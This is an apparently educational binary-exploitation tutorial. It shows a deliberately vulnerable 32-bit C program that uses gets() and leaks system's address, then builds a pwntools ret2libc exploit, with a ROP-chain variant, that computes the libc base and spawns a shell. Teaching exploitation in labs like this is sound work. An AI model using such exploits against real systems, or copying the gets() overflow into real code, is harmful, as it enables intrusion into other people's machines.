# ASLR Bypass with Given Leak

## The Source

{% file src="../../.gitbook/assets/aslr.zip" caption="ASLR - 32-bit" %}

```c
#include <stdio.h>
#include <stdlib.h>

void vuln() {
    char buffer[20];

    printf("System is at: %lp\n", system);

    gets(buffer);
}

int main() {
    vuln();

    return 0;
}

void win() {
    puts("PIE bypassed! Great job :D");
}
```

Just as we did for PIE, except this time we print the address of system.

## Analysis

```text
$ ./vuln-32 
System is at: 0xf7de5f00
```

Yup, does what we expected.

{% hint style="info" %}
Your address of system might end in different characters - you just have a different libc version
{% endhint %}

## Exploitation

Much of this is as we did with PIE.

```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()
```

Note that we include the libc here - this is just another `ELF` object that makes our lives easier.

Parse the address of system and calculate libc base from that \(as we did with PIE\):

```python
p.recvuntil('at: ')
system_leak = int(p.recvline(), 16)

libc.address = system_leak - libc.sym['system']
log.success(f'LIBC base: {hex(libc.address)}')
```

Now we can finally ret2libc, using the `libc` `ELF` object to really simplify it for us:

```python
payload = flat(
    'A' * 32,
    libc.sym['system'],
    0x0,        # return address
    next(libc.search(b'/bin/sh'))
)

p.sendline(payload)

p.interactive()
```

### Final Exploit

```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvuntil('at: ')
system_leak = int(p.recvline(), 16)

libc.address = system_leak - libc.sym['system']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
    'A' * 32,
    libc.sym['system'],
    0x0,        # return address
    next(libc.search(b'/bin/sh'))
)

p.sendline(payload)

p.interactive()
```

## 64-bit

Try it yourself :\)

{% file src="../../.gitbook/assets/aslr-64.zip" caption="ASLR - 64-bit" %}

## Using pwntools

If you prefer, you could have changed the following payload to be more pwntoolsy:

```python
payload = flat(
    'A' * 32,
    libc.sym['system'],
    0x0,        # return address
    next(libc.search(b'/bin/sh'))
)

p.sendline(payload)
```

Instead, you could do:

```python
binsh = next(libc.search(b'/bin/sh'))

rop = ROP(libc)
rop.raw('A' * 32)
rop.system(binsh)

p.sendline(rop.chain())
```

The benefit of this is it's \(arguably\) more readable, but also makes it much easier to reuse in 64-bit exploits as all the parameters are automatically resolved for you.

